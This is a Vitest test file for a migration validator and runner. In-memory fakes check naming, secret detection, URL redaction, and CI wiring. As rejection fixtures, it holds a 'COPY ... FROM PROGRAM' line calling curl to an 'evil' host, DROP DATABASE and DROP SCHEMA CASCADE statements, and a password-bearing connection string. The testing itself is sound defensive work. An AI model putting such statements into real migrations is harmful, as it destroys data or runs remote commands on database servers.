import { describe, it, expect, afterEach } from 'vitest';
import { mkdtempSync, mkdirSync, writeFileSync, rmSync, readFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join, dirname } from 'node:path';
import { fileURLToPath } from 'node:url';

import {
  validateMigrationBaseline,
  MIGRATIONS_DIR_REL,
} from '../../../../src/deployment/validateMigrationBaseline.js';
import {
  MigrationRunner,
  MigrationLedgerError,
  buildMigrationReport,
  resolveMigrationCommand,
  REDACTED,
  type MigrationExecutor,
  type MigrationSource,
  type MigrationPlan,
} from '../../../../src/db/migrations/MigrationRunner.js';

/**
 * Hermetic tests for the migration orchestration baseline. Fully static / in
 * memory: they read repo files, build temp migration fixtures on disk, and drive
 * the runner with in-memory fakes. They NEVER connect to PostgreSQL, run a
 * migration against a database, call Azure / the network, or require credentials.
 */

const here = dirname(fileURLToPath(import.meta.url));
const REPO_ROOT = join(here, '..', '..', '..', '..');

// --- temp-fixture helpers ---------------------------------------------------

const tempRoots: string[] = [];

function makeRepo(files: Record<string, string>): string {
  const root = mkdtempSync(join(tmpdir(), 'house-migrations-'));
  tempRoots.push(root);
  const dir = join(root, MIGRATIONS_DIR_REL);
  mkdirSync(dir, { recursive: true });
  for (const [name, content] of Object.entries(files)) {
    writeFileSync(join(dir, name), content, 'utf8');
  }
  return root;
}

const VALID_MIGRATIONS: Record<string, string> = {
  '0001_init.sql': 'CREATE TABLE public.foo (id int PRIMARY KEY);\n',
  '0002_more.sql': 'CREATE TABLE public.bar (id int PRIMARY KEY);\n',
};

afterEach(() => {
  while (tempRoots.length > 0) {
    const root = tempRoots.pop();
    if (root) rmSync(root, { recursive: true, force: true });
  }
});

// --- in-memory runner fakes -------------------------------------------------

class FakeExecutor implements MigrationExecutor {
  readonly applied: string[] = [];
  constructor(private readonly failOn?: string) {}

  async query(
    sql: string,
    params?: readonly unknown[],
  ): Promise<{ readonly rows: ReadonlyArray<Record<string, unknown>> }> {
    const s = sql.trim();
    if (s.startsWith('CREATE TABLE IF NOT EXISTS')) return { rows: [] };
    if (s.startsWith('SELECT filename')) {
      return { rows: this.applied.map((filename) => ({ filename })) };
    }
    if (s === 'BEGIN' || s === 'COMMIT' || s === 'ROLLBACK') return { rows: [] };
    if (s.startsWith('INSERT INTO')) {
      this.applied.push(String(params?.[0]));
      return { rows: [] };
    }
    if (this.failOn !== undefined && s.includes(this.failOn)) {
      throw new Error('migration body failed');
    }
    return { rows: [] };
  }
}

function fakeSource(files: Record<string, string>): MigrationSource {
  const names = Object.keys(files).sort((a, b) => a.localeCompare(b));
  return {
    list: async () => names,
    read: async (filename: string) => {
      const body = files[filename];
      if (body === undefined) throw new Error(`unknown migration ${filename}`);
      return body;
    },
  };
}

// ---------------------------------------------------------------------------

describe('validateMigrationBaseline (static checks)', () => {
  // (1) Real repo migrations pass.
  it('passes for the current repository migrations', () => {
    const result = validateMigrationBaseline(REPO_ROOT);
    expect(result.ok).toBe(true);
    expect(result.errors).toEqual([]);
  });

  // (2) Missing directory fails closed.
  it('fails when the migrations directory is missing', () => {
    const root = mkdtempSync(join(tmpdir(), 'house-no-migrations-'));
    tempRoots.push(root);
    const result = validateMigrationBaseline(root);
    expect(result.ok).toBe(false);
    expect(result.checks[0]?.name).toBe('migration directory exists');
    expect(result.checks[0]?.ok).toBe(false);
  });

  // (3) Duplicate numeric prefixes fail.
  it('fails on duplicate migration prefixes', () => {
    const root = makeRepo({
      '0001_a.sql': 'CREATE TABLE public.a (id int);\n',
      '0001_b.sql': 'CREATE TABLE public.b (id int);\n',
    });
    const result = validateMigrationBaseline(root);
    expect(result.ok).toBe(false);
    expect(result.checks.find((c) => c.name === 'no duplicate migration prefixes')?.ok).toBe(false);
  });

  // (4) Non-contiguous prefixes fail.
  it('fails on non-contiguous migration prefixes', () => {
    const root = makeRepo({
      '0001_a.sql': 'CREATE TABLE public.a (id int);\n',
      '0003_c.sql': 'CREATE TABLE public.c (id int);\n',
    });
    const result = validateMigrationBaseline(root);
    expect(result.ok).toBe(false);
    expect(
      result.checks.find((c) => c.name === 'migration prefixes are contiguous from 0001')?.ok,
    ).toBe(false);
  });

  // (5) Empty migration files fail.
  it('fails on an empty migration file', () => {
    const root = makeRepo({
      '0001_init.sql': 'CREATE TABLE public.foo (id int);\n',
      '0002_empty.sql': '   \n',
    });
    const result = validateMigrationBaseline(root);
    expect(result.ok).toBe(false);
    expect(result.checks.find((c) => c.name === 'no empty migration files')?.ok).toBe(false);
  });

  // (6) Secret-like values are detected.
  it('detects secret-like values in a migration', () => {
    const root = makeRepo({
      ...VALID_MIGRATIONS,
      '0003_leak.sql': "-- seed\nCREATE TABLE public.x (u text DEFAULT 'postgres://migrator:Hunter2Hunter2@dbhost/the_house');\n",
    });
    const result = validateMigrationBaseline(root);
    expect(result.ok).toBe(false);
    expect(result.checks.find((c) => c.name === 'no secret-like values in migrations')?.ok).toBe(
      false,
    );
  });

  // (7) DROP DATABASE is rejected.
  it('rejects DROP DATABASE statements', () => {
    const root = makeRepo({
      '0001_init.sql': 'CREATE TABLE public.foo (id int);\n',
      '0002_danger.sql': 'DROP DATABASE the_house;\n',
    });
    const result = validateMigrationBaseline(root);
    expect(result.ok).toBe(false);
    expect(
      result.checks.find((c) => c.name === 'no destructive/superuser statements in migrations')?.ok,
    ).toBe(false);
  });

  // (8) DROP SCHEMA is rejected.
  it('rejects DROP SCHEMA statements', () => {
    const root = makeRepo({
      '0001_init.sql': 'CREATE TABLE public.foo (id int);\n',
      '0002_danger.sql': 'DROP SCHEMA governance CASCADE;\n',
    });
    const result = validateMigrationBaseline(root);
    expect(result.ok).toBe(false);
    expect(
      result.checks.find((c) => c.name === 'no destructive/superuser statements in migrations')?.ok,
    ).toBe(false);
  });

  // (9) ALTER SYSTEM is rejected.
  it('rejects ALTER SYSTEM statements', () => {
    const root = makeRepo({
      '0001_init.sql': 'CREATE TABLE public.foo (id int);\n',
      '0002_danger.sql': "ALTER SYSTEM SET shared_buffers = '1GB';\n",
    });
    const result = validateMigrationBaseline(root);
    expect(result.ok).toBe(false);
    expect(
      result.checks.find((c) => c.name === 'no destructive/superuser statements in migrations')?.ok,
    ).toBe(false);
  });

  // (10) COPY ... PROGRAM is rejected.
  it('rejects COPY ... PROGRAM statements', () => {
    const root = makeRepo({
      '0001_init.sql': 'CREATE TABLE public.foo (id int);\n',
      '0002_danger.sql': "COPY public.foo FROM PROGRAM 'curl http://evil';\n",
    });
    const result = validateMigrationBaseline(root);
    expect(result.ok).toBe(false);
    expect(
      result.checks.find((c) => c.name === 'no destructive/superuser statements in migrations')?.ok,
    ).toBe(false);
  });

  // (11) Sport-specific terminology in active SQL is rejected.
  it('rejects sport-specific terminology in active SQL', () => {
    const root = makeRepo({
      '0001_init.sql': 'CREATE TABLE public.foo (id int);\n',
      '0002_sport.sql': 'CREATE TABLE public.curling_event (id int);\n',
    });
    const result = validateMigrationBaseline(root);
    expect(result.ok).toBe(false);
    expect(
      result.checks.find((c) => c.name === 'no sport-specific terminology in migrations')?.ok,
    ).toBe(false);
  });
});

describe('resolveMigrationCommand (CLI/env contract)', () => {
  // (12) plan requires MIGRATE_DATABASE_URL.
  it('requires MIGRATE_DATABASE_URL for --plan', () => {
    const command = resolveMigrationCommand(['--plan'], {});
    expect(command.kind).toBe('error');
    if (command.kind === 'error') {
      expect(command.message).toContain('MIGRATE_DATABASE_URL');
    }
  });

  // (13) The restricted DATABASE_URL alone is refused.
  it('refuses to run with only DATABASE_URL set', () => {
    const command = resolveMigrationCommand(['--plan'], {
      DATABASE_URL: 'postgres://app:app@localhost/app',
    });
    expect(command.kind).toBe('error');
    if (command.kind === 'error') {
      expect(command.message).toContain('MIGRATE_DATABASE_URL');
    }
  });

  // (14) A mode flag is required.
  it('rejects a missing --plan/--apply mode', () => {
    const command = resolveMigrationCommand([], {
      MIGRATE_DATABASE_URL: 'postgres://migrator:pw@localhost/db',
    });
    expect(command.kind).toBe('error');
  });

  // (15) Both flags is ambiguous and rejected.
  it('rejects passing both --plan and --apply', () => {
    const command = resolveMigrationCommand(['--plan', '--apply'], {
      MIGRATE_DATABASE_URL: 'postgres://migrator:pw@localhost/db',
    });
    expect(command.kind).toBe('error');
  });

  it('resolves a plan command when MIGRATE_DATABASE_URL is present', () => {
    const command = resolveMigrationCommand(['--plan'], {
      MIGRATE_DATABASE_URL: 'postgres://migrator:pw@localhost/db',
    });
    expect(command.kind).toBe('plan');
  });
});

describe('buildMigrationReport (redaction)', () => {
  // (16) The report never embeds a connection string.
  it('redacts the database URL in the report', () => {
    const plan: MigrationPlan = {
      applied: ['0001_init.sql'],
      pending: ['0002_more.sql'],
      latestApplied: '0001_init.sql',
      latestAvailable: '0002_more.sql',
    };
    const report = buildMigrationReport(plan, 'db/migrations');
    expect(report.databaseUrl).toBe(REDACTED);
    expect(JSON.stringify(report)).not.toContain('postgres://');
  });
});

describe('MigrationRunner (in-memory)', () => {
  it('plans every migration as pending against an empty ledger', async () => {
    const runner = new MigrationRunner(fakeSource(VALID_MIGRATIONS), new FakeExecutor());
    const plan = await runner.plan();
    expect(plan.applied).toEqual([]);
    expect(plan.pending).toEqual(['0001_init.sql', '0002_more.sql']);
    expect(plan.latestAvailable).toBe('0002_more.sql');
  });

  it('applies pending migrations in order and is idempotent on re-run', async () => {
    const executor = new FakeExecutor();
    const runner = new MigrationRunner(fakeSource(VALID_MIGRATIONS), executor);

    const first = await runner.apply();
    expect(first).toEqual(['0001_init.sql', '0002_more.sql']);

    const second = await runner.apply();
    expect(second).toEqual([]);

    const plan = await runner.plan();
    expect(plan.pending).toEqual([]);
    expect(plan.applied).toEqual(['0001_init.sql', '0002_more.sql']);
  });

  it('fails closed when the ledger is out of order', async () => {
    const executor = new FakeExecutor();
    // Pretend 0002 was applied while 0001 is still pending.
    executor.applied.push('0002_more.sql');
    const runner = new MigrationRunner(fakeSource(VALID_MIGRATIONS), executor);
    await expect(runner.plan()).rejects.toBeInstanceOf(MigrationLedgerError);
  });

  it('rolls back and stops on a failing migration', async () => {
    const executor = new FakeExecutor('public.bar');
    const runner = new MigrationRunner(fakeSource(VALID_MIGRATIONS), executor);
    await expect(runner.apply()).rejects.toThrow('migration body failed');
    // The first migration committed; the failing second one did not.
    expect(executor.applied).toEqual(['0001_init.sql']);
  });
});

describe('release wiring (real repo files)', () => {
  function readPackageScripts(): Record<string, string> {
    const pkg = JSON.parse(readFileSync(join(REPO_ROOT, 'package.json'), 'utf8')) as {
      scripts?: Record<string, string>;
    };
    return pkg.scripts ?? {};
  }

  // (17) package.json exposes the migration scripts.
  it('exposes migrations:check, migrations:plan, and migrations:apply scripts', () => {
    const scripts = readPackageScripts();
    expect(scripts['migrations:check']).toBe('tsx scripts/validate-migrations.ts');
    expect(scripts['migrations:plan']).toBe('tsx scripts/migrate-db.ts --plan');
    expect(scripts['migrations:apply']).toBe('tsx scripts/migrate-db.ts --apply');
  });

  // (18) CI validates migrations statically (and never applies them).
  it('runs migrations:check in the CI workflow', () => {
    const ci = readFileSync(join(REPO_ROOT, '.github', 'workflows', 'ci.yml'), 'utf8');
    expect(ci).toContain('npm run migrations:check');
    expect(ci).not.toContain('migrations:apply');
  });

  // (19) The guarded production template includes plan + apply placeholders.
  it('includes guarded migration plan/apply steps in the production template', () => {
    const template = readFileSync(
      join(REPO_ROOT, '.github', 'workflows', 'production-deploy-template.yml'),
      'utf8',
    );
    expect(template).toContain('npm run migrations:plan');
    expect(template).toContain('npm run migrations:apply');
    expect(template).toContain('MIGRATE_DATABASE_URL');
    // Still gated behind the explicit deploy confirmation.
    expect(template).toContain("inputs.confirm == 'DEPLOY'");
  });

  // (20) The application entrypoints never auto-run migrations.
  it('does not run migrations from the API or worker entrypoints', () => {
    for (const entry of ['api.ts', 'worker.ts']) {
      const source = readFileSync(join(REPO_ROOT, 'src', 'server', entry), 'utf8');
      expect(source).not.toContain('MigrationRunner');
      expect(source).not.toContain('migrate-db');
      expect(source).not.toContain('migrations/MigrationRunner');
    }
  });
});
